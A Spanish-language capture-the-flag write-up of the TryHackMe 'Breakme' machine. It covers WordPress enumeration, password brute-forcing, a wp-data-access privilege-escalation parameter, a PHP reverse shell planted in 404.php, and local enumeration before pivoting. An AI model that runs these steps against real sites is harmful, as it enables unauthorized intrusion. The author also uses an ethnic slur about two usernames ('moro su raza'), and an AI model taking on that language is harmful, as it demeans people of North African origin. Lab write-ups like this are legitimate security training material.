# Introducción

Hoy nos enfrentamos a una de las máquinas mas interesantes de THM, siendo de nivel Medio, (yo considero dificil).

Nos enfrentamos a una máquina en la que nos encontramos un Linux como Sistema Operativo y un Apache y un SSH

# Conectividad

Para empezar el primer paso que debemos hacer es un test de conectividad y comprobar que estamos dentro de la red.

```
┌──(root㉿kali)-[~]
└─# ping 10.10.102.26
PING 10.10.102.26 (10.10.102.26) 56(84) bytes of data.
64 bytes from 10.10.102.26: icmp_seq=1 ttl=64 time=1.03 ms
64 bytes from 10.10.102.26: icmp_seq=2 ttl=64 time=1.30 ms
^C
--- 10.10.102.26 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1000ms
rtt min/avg/max/mdev = 1.027/1.163/1.299/0.136 ms
```

Como vemos nos encontramos a una máquina Linux (ttl=64)

# Enumeración

Para empezar solemos hacer un escaneo de puertos a la IP o si queremos meter la IP dentro de un DNS para tener mayor control del nombre, cosa que yo no voy a hacer.

```
┌──(root㉿kali)-[~]
└─# sudo nmap -sCVS -T4 -p- --min-rate 5000 10.10.102.26
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-18 14:07 UTC
Nmap scan report for ip-10-10-102-26.eu-west-1.compute.internal (10.10.102.26)
Host is up (0.0055s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e4f777ff6aa6adc17c9bf5a2beb8c41 (RSA)
|   256 a39c6673fcb923c00fda1dc984d6b14a (ECDSA)
|_  256 6dc20e89255510a99e416e0d819a17cb (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 02:DE:B5:20:31:85 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds
```

- 22 / ssh
- 80 / http - 2.4.56

Si nos vamos a la web alojada en el puerto 80 veremos que es un apache por defecto, normalmente en estos casos enumeramos servicios, la versión de apache y enumeramos directorios.

Para empezar suelo enumerar directorios antes que versiones, por si podemos encontrar mas información.

En mi caso voy a utilizar ffuf 

```
ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://10.10.102.26/FUZZ
```

Si nos fijamos bien encontramos dos directorios /manual y /wordpress 

Manual suele ser el manual mismo de apache en el que dudo que podamos encontrar algo, pero podríamos probar a hacer un escaneo de directorios recursivos a esta url e encontrar igual información importante.

Vamos a enumerar el wordpress a ver que encontramos, normalmente para un wordpress se utiliza wp-scan, también podemos ir enumerando manualmente y buscar o usuarios por Post o cosas diferentes.

```
wpscan --url http://10.10.102.26/wordpress
```

```
[+] wp-data-access
 | Location: http://10.10.102.26/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2025-02-16T23:59:00.000Z
 | [!] The version is out of date, the latest version is 5.5.34
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.102.26/wordpress/wp-content/plugins/wp-data-access/readme.txt
```

Parece que encontramos información importante como el tema que esta usando y un plugin desactualizado, pero igualmente con esto poco hacemos vamos a probar a enumerar usuarios

```
┌──(root㉿kali)-[~]
└─# wpscan --url http://10.10.102.26/wordpress --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.102.26/wordpress/ [10.10.102.26]
[+] Started: Tue Feb 18 14:14:38 2025

Interesting Finding(s):

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.102.26/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bob
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Parece ser que hemos encontrado al usuario bob, desde aquí tiene toda la pinta de que le vamos a poder entrar por fuerza bruta.

```
wpscan --url http://10.10.102.26/wordpress -U bob -P /usr/share/wordlists/rockyou.txt

[!] Valid Combinations Found:
 | Username: bob, Password: ####
```

Como podemos ver y era un poco obvio ibamos a encontrar la pass con esto, ni me he molestado en poner el admin.

Vamos a irnos a iniciar sesión al wodpress y desde ahi enumerarlo, la cosa es que ni wp-admin ni wp-login existen, vamos a tener que encontrar la forma de loguearnos.

Parece ser que en la "sample page" hay un link al "login"

```
http://10.10.102.26/wordpress/index.php/sample-page/
```

Estamos dentro del wordpress con bob, ahora toca enumerar y no olvidarnos del plugin anteriormente encontrado ya que seguramente tenga algo que vero  no.

Enumerando el wordpress la verdad que no he encontrado una mierda, voy a buscar info de los plugins de wordpress

POC:

https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/

Explicación:

Parece ser que el plugin Wp_data (Anteriormente reconocido) es vulnerable a una escala de privilegios en versiones superiores y incluyendo la 5.3.7. Simplemente cambiado la funcion "multiple_roles_update" hace que el atacante (nosotros) sea posible autentificarnos como administradores. 

Deberemos irnos al update de perfil e interceptar la Request, posteriormente añadir el parametro

```
&wpda_role[]=administrator
```

Dando un fallo y forwardeando la request

Para la gente que no sepa configurar un Burp Suite:

- Primero os instalai sel Burp Suite comunity edition
- Una vez instalado necesitaremos un proxy, en mi caso "foxy proxy"
- Añadimos un proxy apuntando a nuestra ip local (127.0.0.1) por el puerto 8080

![image](https://github.com/user-attachments/assets/e41051f5-cd4f-4222-a8fa-533d842668a3)

- Lo guardamos, iniciamos BURP SUITE, lo activamos y nos vamos a dicha ip http://127.0.0.1:8080

![image](https://github.com/user-attachments/assets/10b0e031-f463-4cc3-a584-051f0586f498)

- Pulsais sobre CA Certificate y lo descargais
- Os vais al navegador - configuración - buscais certificate

![image](https://github.com/user-attachments/assets/6c8ebb8f-043c-485f-a967-6202d5ec3bf6)

- La importais y ale (Importante que le deis veracidad a todo)

Ya teneis un proxy de consultas en web

Una vez tengamos todo configurado coguemos la consulta que necesitamos de update

![image](https://github.com/user-attachments/assets/ba63b77c-ec35-4347-8259-cceeb3985852)

Pulsamos para pasarlo "forward"

Si pulsais forward hahy una cosa muy graciosaa, reventais la web entera y podeis reventar a updates jeje

![image](https://github.com/user-attachments/assets/8e351966-097f-440b-a66a-65925bdc9c82)

Pero bueno dejando esta tontería vereis que ahora teneis admin

![image](https://github.com/user-attachments/assets/36d4efd8-e6c9-48ae-9c5f-702b12daba63)

Que toca ahora???

# Explotación

Pues chicos como en todo wordpress vamos a hacer una rev shell super simple, nos vamos al tema en cuestión, coguemos cualquier php y lo cambiamos por una rev shell y luego apuntamos a el, yo suelo coger el 404 porque basicamente da igual donde apuntes que siempre te va a tocar ese.

Ya sabéis el tema One y el 404.php

![image](https://github.com/user-attachments/assets/8a18d459-8238-4a36-a3d5-f11648c4a588)

Nos vamos a cualquier web que haga revshells como pentest monkey la cambiamos por el código

![image](https://github.com/user-attachments/assets/a21aaac1-6f37-493d-bb45-8fbe943e42f9)

Y ale a ponerse en escucha ya como querais con nc o rlwrap

Ahora pues apuntamos no se o al mismo lugar donde esta que ya lo sabemos o cualquier que sepamos que nos va a dar esa respuesta.

```
http://10.10.102.26/wordpress/wp-content/themes/twentytwentyone/404.php
```

```                                                                                         
┌──(root㉿kali)-[~]
└─# nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.67.89] from (UNKNOWN) [10.10.102.26] 33704
Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64 GNU/Linux
 09:34:47 up 33 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (633): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Breakme:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Breakme:/$ 
```

Una vez estamos dentro vamos a enumerar lo principal, usuarios, o para la gente mas llorica upgradearse la shell a mi no me importa la verdad.

También podemos utilizar el mágico Linpeas, pero por ahora prefiero hacerlo más manual, si me aburro pues lo automatizare.

```
www-data@Breakme:/$ cat /etc/passwd
cat /etc/passwd

john:x:1002:1002:john wick,14,14,14:/home/john:/bin/bash
youcef:x:1000:1000:youcef,17,17,17:/home/youcef:/bin/bash
```

- john y youcef tiene to el nombre moro su raza pero bueno no pasa nada

Vamos a ver si tenemos permisos de algo en estos usuarios

```
ls -al
total 32
drwxr-xr-x  5 root   root  4096 Feb  3  2024 .
drwxr-xr-x 18 root   root  4096 Aug 17  2021 ..
drwxr-xr-x  4 john   john  4096 Aug  3  2023 john
drwx------  2 root   root 16384 Aug 17  2021 lost+found
drwxr-x---  4 youcef john  4096 Aug  3  2023 youcef
```

Vaya vaya parece ser que tenemos acceso a john pero na maas

```
www-data@Breakme:/home/john$ ls -al
ls -al
total 32
drwxr-xr-x 4 john john 4096 Aug  3  2023 .
drwxr-xr-x 5 root root 4096 Feb  3  2024 ..
lrwxrwxrwx 1 john john    9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 Jul 31  2023 .bash_logout
-rw-r--r-- 1 john john 3526 Jul 31  2023 .bashrc
drwxr-xr-x 3 john john 4096 Jul 31  2023 .local
-rw-r--r-- 1 john john  807 Jul 31  2023 .profile
drwx------ 2 john john 4096 Feb  4  2024 internal
-rw------- 1 john john   33 Aug  3  2023 user1.txt
```

Y aqui parece ser que el .bash lo tiene quitado el user1.txt no tenemos permisos. Por aquí poco podemos hacer

El siguiente paso que podemos hacer o es enumerar servicios que corran en local o tareas, prefiero servicios porque es lo más rápido la verdad.

```
netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

Si os fijais parece ser que tenemos 2 puertos abeirtos corriendo en local el 3306 y el 9999, si no teniais estos conocimientos se puede hacer un curl a esto desde la misma máquina para ver que puede ser, curl nos referimos si tiene una web o algo alojada y si es así pues enumeramos bastante.

Si haceis un curl a diferentes puertos podeis ver que el 9999 es una web. 

![image](https://github.com/user-attachments/assets/d45a9427-cb9a-4961-804f-7970c77be1e8)

Una web pero que web?

Por lo que leo en el HTML parece ser 3 cajitas para meter inputs como usuario que da resultados, en el que uno checkea un target, otro un usuario y otro un archivo. Puede ser interesante? pues tiene toda la pinta la verdad, pero... muy raro me parecería

Vamos a enumerar primero servicios no vaya a ser que nos montemos un tunel para nada.

En este caso vamos a utilizar pspy 

https://github.com/DominicBreuker/pspy

Normalmente en estos casos, es muy simple pasar este archivo a la máquina local ya sea desde el mismo wordpress o como queramos, normalmente lo solemos meter en /tmp ya que aqui solemos tener permisos

Normalmente para pasar este tipo de archivos es muy simple, nos montamos una web con python

```
pytho3 -m http.server
```

y desde ahi ya metemos un wget desde nuestra máquina víctima y nos descargamos el archivo

![image](https://github.com/user-attachments/assets/b0eb5844-80b4-470d-9b8b-834097f6c512)

Si nos fijamos a lo tonto teniamos razon con el puerto abierto y parece ser que hay un usuario UID=1002 corriendo en este proceso jiji

```
john:x:1002:1002:john wick,14,14,14:/home/john:/bin/bash
```

Creo que ya sabemos por donde tirar no?

a Pivotear

Voy a utilizar ligolo-ng

https://github.com/nicocha30/ligolo-ng















